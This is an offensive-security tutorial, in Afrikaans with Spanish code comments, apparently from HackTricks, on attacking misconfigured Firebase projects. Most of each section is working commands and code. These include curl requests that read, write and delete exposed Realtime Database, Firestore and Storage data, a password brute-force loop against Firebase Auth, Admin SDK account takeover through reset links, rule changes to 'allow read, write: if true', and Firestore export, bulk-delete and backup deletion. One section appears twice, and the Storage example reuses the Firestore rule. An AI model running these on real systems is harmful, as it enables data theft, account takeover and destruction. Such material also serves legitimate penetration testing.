# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Ongeauthentiseerde toegang tot Firebase Realtime Database
'n Aanvaller het nie spesifieke Firebase-permissies nodig om hierdie aanval uit te voer nie. Dit vereis slegs dat daar 'n kwesbare konfigurasie in die Firebase Realtime Database security rules is, waar die reëls gestel is met `.read: true` of `.write: true`, wat publieke lees- of skryftoegang toelaat.

Die aanvaller moet die databasis-URL identifiseer, wat tipies die formaat volg: `https://<project-id>.firebaseio.com/`.

Hierdie URL kan gevind word deur mobile application reverse engineering (decompiling Android APKs of analyzing iOS apps), deur configuration files soos google-services.json (Android) of GoogleService-Info.plist (iOS) te ontleed, deur die source code van web applications te inspekteer, of deur network traffic te ondersoek om versoeke na `*.firebaseio.com` domeine te identifiseer.

Die aanvaller identifiseer die databasis-URL en kontroleer of dit publiek beskikbaar is, en kry dan toegang tot die data en skryf moontlik kwaadwillige inligting.

Eerstens kontroleer hulle of die databasis leestoegang toelaat deur .json aan die URL toe te voeg.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
As die response JSON-data of null bevat (in plaas van "Permission Denied"), laat die databasis read access toe. Om write access te kontroleer, kan die attacker probeer om 'n test write request te stuur met behulp van die Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
As die operasie slaag, laat die database ook skryftoegang toe.

### Blootstelling van data in Cloud Firestore
Die aanvaller het geen spesifieke Firebase-permissies nodig om hierdie aanval uit te voer nie. Dit vereis slegs dat daar 'n kwesbare konfigurasie in die Cloud Firestore-sekuriteitsreëls is waarin die reëls lees- of skryftoegang sonder verifikasie of met onvoldoende validering toelaat. 'n Voorbeeld van 'n wanopgestelde reël wat volle toegang verleen, is:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Hierdie reël laat enigiemand toe om alle dokumente te lees en te skryf sonder enige beperkinge. Firestore-reëls is fynkorrelig en geld per versameling en dokument, sodat 'n fout in 'n spesifieke reël moontlik slegs sekere versamelings blootstel.

Die aanvaller moet die Firebase Project ID identifiseer, wat gevind kan word deur mobiele app reverse engineering, ontleding van konfigurasielêers soos google-services.json of GoogleService-Info.plist, inspeksie van die bronkode van webtoepassings, of ontleding van netwerkverkeer om versoeke na firestore.googleapis.com te identifiseer.
Die Firestore REST API gebruik die formaat:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
As die reëls unauthenticated read access toelaat, kan die aanvaller collections and documents lees. Eerstens probeer hulle toegang kry tot 'n spesifieke collection:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
As die antwoord JSON-dokumente bevat in plaas van ’n toestemmingsfout, is die collection blootgestel. Die aanvaller kan alle toeganklike collections opsom deur algemene name te probeer of die struktuur van die toepassing te ontleed. Om toegang tot ’n spesifieke document:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
As die reëls ongeauthentiseerde skryf-toegang toelaat of onvoldoende validering het, kan die aanvaller nuwe dokumente skep:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Om 'n bestaande dokument te wysig, moet PATCH gebruik word:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Om 'n dokument te verwyder en denial-of-service te veroorsaak:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Blootstelling van lêers in Firebase Storage
'n Aanvaller het nie enige spesifieke Firebase-toestemmings nodig om hierdie aanval uit te voer nie. Dit vereis slegs dat daar 'n kwesbare konfigurasie in die Firebase Storage security rules is waar die reëls lees- of skryftoegang sonder verifikasie of met onvoldoende validering toelaat. Storage rules beheer lees- en skryftoestemmings onafhanklik, dus kan 'n fout in 'n reël slegs lees-toegang, slegs skryf-toegang, of albei openbaarmaak. 'n Voorbeeld van 'n verkeerd gekonfigureerde reël wat volle toegang gee, is:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Hierdie reël staan lees- en skryftoegang tot alle dokumente toe sonder enige beperkings. Firestore-reëls is fynkorrelig en word per versameling en per dokument toegepas, so 'n fout in 'n spesifieke reël kan slegs sekere versamelings blootstel. Die aanvaller moet die Firebase Project ID identifiseer, wat gevind kan word deur mobile application reverse engineering, ontleding van konfigurasielêers soos google-services.json of GoogleService-Info.plist, inspeksie van webtoepassings se bronkode, of netwerkverkeersontleding om versoeke na firestore.googleapis.com te identifiseer.

Die Firestore REST API gebruik die formaat: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

As die reëls nie-geauthentiseerde lees-toegang toelaat, kan die aanvaller versamelings en dokumente lees. Eerstens probeer hulle toegang kry tot 'n spesifieke versameling.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
As die respons die lys van lêers bevat in plaas van 'n toestemmingsfout, is die lêer blootgestel. Die attacker kan die inhoud van die lêers besigtig deur hul pad te spesifiseer:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
As die reëls unauthenticated write access toelaat of insufficient validation het, kan die attacker kwaadwillige lêers oplaai. Om 'n lêer deur die REST API op te laai:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Die aanvaller kan code shells, malware payloads, of groot lêers oplaai om 'n denial of service te veroorsaak. As die toepassing opgelaaide lêers verwerk of uitvoer, kan die aanvaller remote code execution bereik. Om lêers te verwyder en 'n denial of service te veroorsaak:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Aanroep van openbare Firebase Cloud Functions
’n Aanvaller het nie spesifieke Firebase-toestemmings nodig om hierdie probleem uit te buit nie; dit vereis slegs dat ’n Cloud Function openbaarlik oor HTTP beskikbaar is sonder verifikasie.

’n Funksie is kwesbaar wanneer dit onveilig gekonfigureer is:

- Dit gebruik `functions.https.onRequest`, wat nie verifikasie afdwing nie (anders as `onCall` functions).
- Die funksie se kode valider nie gebruiker-verifikasie nie (bv. geen kontroles vir `request.auth` of `context.auth` nie).
- Die funksie is openbaarlik toeganklik in IAM, wat beteken `allUsers` het die `roles/cloudfunctions.invoker` rol. Dit is die standaardgedrag vir HTTP functions tensy die ontwikkelaar toegang beperk.

Firebase HTTP Cloud Functions word blootgestel deur URLs soos:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (when integrated with Firebase Hosting)

’n Aanvaller kan hierdie URL's ontdek deur bronkode-analise, netwerkverkeerinspeksie, enumerasietools, of mobiele app reverse engineering.
As die funksie openbaar blootgestel en sonder verifikasie is, kan die aanvaller dit direk aanroep sonder geloofsbriewe.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
As die funksie nie insette behoorlik valideer nie, kan die attacker ander aanvalle probeer, soos code injection of command injection.


### Brute-force attack teen Firebase Authentication met 'n swak wagwoordbeleid
An attacker does not need any specific Firebase permissions to carry out this attack. Dit vereis slegs dat die Firebase API Key in mobile of web applications blootgestel is, en dat die password policy nie met strengere vereistes as die defaults gekonfigureer is nie.

Die attacker moet die Firebase API Key identifiseer, wat gevind kan word deur mobile app reverse engineering, ontleding van konfigurasielêers soos google-services.json of GoogleService-Info.plist, inspeksie van die bronkode van web applications (e.g., in bootstrap.js), of ontleding van netwerkverkeer.

Firebase Authentication’s REST API uses the endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
om te verifieer met email en password.

If Email Enumeration Protection is disabled, API error responses can reveal whether an email exists in the system (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), which allows attackers to enumerate users before attempting password guessing. Wanneer hierdie protection geaktiveer is, stuur die API dieselfde foutboodskap vir beide nie-bestaande e-posse en verkeerde passwords, wat user enumeration voorkom.

Dit is belangrik om te let dat Firebase Authentication rate limiting afdwing, wat versoeke kan blokkeer as te veel authentication attempts binne 'n kort tyd plaasvind. Daarom sal 'n attacker vertragings tussen pogings moet inbring om te voorkom dat hulle rate-limited word.

Die attacker identifiseer die API Key en voer authentication attempts uit met verskeie passwords teen bekende rekeninge. If Email Enumeration Protection is disabled, the attacker can enumerate existing users by analyzing the error responses:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
As die respons EMAIL_NOT_FOUND bevat, bestaan die e-pos nie in die stelsel nie. As dit INVALID_PASSWORD bevat, bestaan die e-pos, maar die wagwoord is verkeerd, wat bevestig dat die gebruiker geregistreer is. Sodra 'n geldige gebruiker geïdentifiseer is, kan die aanvaller brute-force-pogings uitvoer. Dit is belangrik om pouses tussen pogings in te voeg om Firebase Authentication’s rate-limiting mechanisms te vermy:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Met die verstek wagwoordbeleid (minimum 6 karakters, geen kompleksiteitsvereistes nie), kan die aanvaller alle moontlike kombinasies van 6-karakter wagwoorde probeer, wat 'n relatief klein soekruimte verteenwoordig in vergelyking met strenger wagwoordbeleide.

### User management in Firebase Authentication

Die aanvaller het spesifieke Firebase Authentication-permissies nodig om hierdie aanval uit te voer. Die vereiste permissies is:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

These permissions are included in the `roles/firebaseauth.admin` role, which grants full read/write access to Firebase Authentication resources. They are also included in higher-level roles such as roles/firebase.developAdmin (which includes all firebaseauth.* permissions) and roles/firebase.admin (full access to all Firebase services).

Om die Firebase Admin SDK te gebruik, benodig die aanvaller toegang tot service account credentials (JSON file), wat gevind kan word op gekompromitteerde stelsels, publiek blootgestelde code repositories, gekompromitteerde CI/CD-stelsels, of deur die kompromittering van ontwikkelaarsrekeninge wat toegang tot hierdie credentials het.

Die eerste stap is om die Firebase Admin SDK te konfigureer met behulp van service account credentials.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Om 'n kwaadwillige gebruiker te skep wat 'n slagoffer se e-pos gebruik, sal die aanvaller probeer om die Firebase Admin SDK te gebruik om 'n nuwe rekening onder daardie e-pos aan te maak.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Om 'n bestaande gebruiker te wysig, sal die aanvaller velde soos die e-posadres, die verifikasiestatus of die aktiveringsstatus van die rekening bywerk.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Om 'n gebruikersrekening te verwyder en 'n denial of service te veroorsaak, sal die attacker 'n versoek stuur om die gebruiker heeltemal te verwyder.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Die aanvaller kan ook inligting oor bestaande gebruikers bekom deur hul UID of e-posadres te versoek.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Boonop kan die attacker verification links of password-reset links genereer om 'n gebruiker se wagwoord te verander en toegang tot hulle rekening te verkry.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Gebruikersbestuur in Firebase Authentication
'n Aanvaller benodig spesifieke Firebase Authentication-permissies om hierdie aanval uit te voer. Die vereiste permissies is:

- `firebaseauth.users.create` om gebruikers te skep
- `firebaseauth.users.update` om bestaande gebruikers te wysig
- `firebaseauth.users.delete` om gebruikers te verwyder
- `firebaseauth.users.get` om gebruikersinligting te bekom
- `firebaseauth.users.sendEmail` om e-posse aan gebruikers te stuur
- `firebaseauth.users.createSession` om gebruikersessies te skep

Hierdie permissies is ingesluit in die roles/firebaseauth.admin-rol, wat volle lees/skryf-toegang tot Firebase Authentication-hulpbronne verleen. Hulle is ook deel van hoërvlak-rolle soos `roles/firebase.developAdmin` (wat alle firebaseauth.* permissies insluit) en `roles/firebase.admin` (volle toegang tot alle Firebase-dienste).

Om die Firebase Admin SDK te gebruik, sal die aanvaller toegang tot service account credentials (a JSON file) nodig hê, wat bekom kan word van gekompromitteerde stelsels, openbaar blootgestelde code repositories, gekompromitteerde CI/CD-omgewings, of deur die kompromittering van ontwikkelaarsrekeninge wat toegang tot hierdie credentials het.

Die eerste stap is om die Firebase Admin SDK te konfigureer deur service account credentials te gebruik.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Om 'n kwaadwillige gebruiker te skep wat die victim se e-pos gebruik, sou die attacker probeer om 'n nuwe user account met daardie e-pos te skep en hul eie password en profile information toe te ken.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Om 'n bestaande gebruiker te wysig, sal die aanvaller velde soos die e-posadres, verifikasiestatus of die feit of die rekening gedeaktiveer is, verander.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Om 'n gebruikersrekening te verwyder—wat effektief 'n denial of service veroorsaak—sou die aanvaller 'n versoek stuur om daardie gebruiker permanent te verwyder.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Die aanvaller kon ook inligting oor bestaande gebruikers verkry, soos hul UID of email, deur gebruikersbesonderhede op te vra, hetsy per UID of per email address.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Daarbenewens kan die aanvaller verifikasie-skakels of wagwoordherstelskakels genereer, wat hulle in staat stel om die wagwoord van 'n gebruiker te verander en beheer oor die rekening te neem.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Wysiging van sekuriteitsreëls in Firebase-dienste
Die aanvaller benodig spesifieke toestemmings om sekuriteitsreëls te wysig, afhangend van die diens. Vir Cloud Firestore en Firebase Cloud Storage is die vereiste toestemmings `firebaserules.rulesets.create` om rulesets te skep en `firebaserules.releases.create` om releases te ontplooi. Hierdie toestemmings is ingesluit in die `roles/firebaserules.admin` rol of in hoërvlak rolle soos `roles/firebase.developAdmin` en `roles/firebase.admin`. Vir Firebase Realtime Database is die vereiste toestemming `firebasedatabase.instances.update`.

Die aanvaller moet die Firebase REST API gebruik om die sekuriteitsreëls te wysig.
Eerstens moet die aanvaller 'n toegangstoken verkry deur diensrekeningbewyse te gebruik.
Om die toegangstoken te verkry:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Om Firebase Realtime Database-reëls te wysig:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Om Cloud Firestore-reëls te wysig, moet die aanvaller 'n ruleset skep en dit dan ontplooi:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Die vorige opdrag gee ’n ruleset-naam terug in die formaat projects/<project-id>/rulesets/<ruleset-id>. Om die nuwe weergawe te ontplooi, moet die release opgedateer word met ’n PATCH request:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Om Firebase Cloud Storage-reëls te wysig:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Die vorige opdrag gee 'n ruleset-naam terug in die formaat projects/<project-id>/rulesets/<ruleset-id>. Om die nuwe weergawe te ontplooi, moet die release met 'n PATCH-versoek bygewerk word:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Data exfiltration en manipulasie in Cloud Firestore
Cloud Firestore gebruik dieselfde infrastruktuur en toestemmestelsel as Cloud Datastore, so Datastore IAM-toestemmings is direk van toepassing op Firestore. Om TTL-beleide te manipuleer, is die `datastore.indexes.update` toestemming nodig. Om data te eksporteer, is die `datastore.databases.export` toestemming nodig. Om data te importeer, is die datastore.databases.import toestemming nodig. Om data in bulk te verwyder, is die `datastore.databases.bulkDelete` toestemming nodig.

Vir rugsteun- en herstelaksies is spesifieke toestemmings nodig:

- `datastore.backups.get` en `datastore.backups.list` om beskikbare rugsteune op te som en besonderhede daarvan te kry
- `datastore.backups.delete` om rugsteune te verwyder
- `datastore.backups.restoreDatabase` om 'n databasis vanaf 'n rugsteun te herstel
- `datastore.backupSchedules.create` en `datastore.backupSchedules.delete` om rugsteunskedules te bestuur

Wanneer 'n TTL-beleid geskep word, word 'n aangewese eienskap gekies om entiteite te identifiseer wat vir uitwissing in aanmerking kom. Hierdie TTL-eienskap moet van die datum- en tydtipe wees. Die aanvaller kan 'n eienskap kies wat reeds bestaan of 'n eienskap aanwys wat hulle later beplan om by te voeg. As die waarde van die veld 'n datum in die verlede is, kom die dokument in aanmerking vir onmiddellike verwydering. Die aanvaller kan die gcloud CLI gebruik om TTL-beleide te manipuleer.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Om data te eksporteer en dit te exfiltrate, kan die aanvaller die gcloud CLI gebruik.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Om kwaadwillige data in te voer:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Om massiewe dataverwydering uit te voer en 'n denial of service te veroorsaak, kan die aanvaller die gcloud Firestore bulk-delete-gereedskap gebruik om hele kolleksies te verwyder.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Vir rugsteun- en herstelbewerkings kan die aanvaller geskeduleerde rugsteune skep om die huidige toestand van die databasis vas te lê, bestaande rugsteune te lys, van 'n rugsteun te herstel om onlangse veranderings te oorskryf, rugsteune te verwyder om permanente dataverlies te veroorsaak, en geskeduleerde rugsteune te verwyder.
Om 'n daaglikse rugsteunskedule te skep wat onmiddellik 'n rugsteun genereer:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Om van 'n spesifieke rugsteun te herstel, kan die aanvaller 'n nuwe databasis skep met die data wat in daardie rugsteun is. Die hersteloperasie skryf die rugsteun se data in 'n nuwe databasis, wat beteken dat 'n bestaande DATABASE_ID nie gebruik kan word nie.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Om 'n rugsteun te verwyder en permanente dataverlies te veroorsaak:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Diefstal en wanbruik van Firebase CLI-inlogbewyse
'n Aanvaller het nie spesifieke Firebase-permissies nodig om hierdie aanval uit te voer nie, maar hulle het wel toegang tot die ontwikkelaar se plaaslike stelsel of na die Firebase CLI-inlogbewyse-lêer nodig. Hierdie inlogbewyse word gestoor in ’n JSON-lêer geleë by:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Hierdie lêer bevat outentiserings-tokens, insluitend die refresh_token en access_token, wat die aanvaller toelaat om te outentiseer as die gebruiker wat oorspronklik firebase login uitgevoer het.

Die aanvaller verkry toegang tot die Firebase CLI-inlogbewyse-lêer. Hulle kan dan die hele lêer na hul eie stelsel kopieer, en die Firebase CLI sal outomaties die inlogbewyse vanaf sy standaardplek gebruik. Nadat dit gedoen is, kan die aanvaller al die Firebase-projekte sien waartoe daardie gebruiker toegang het.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
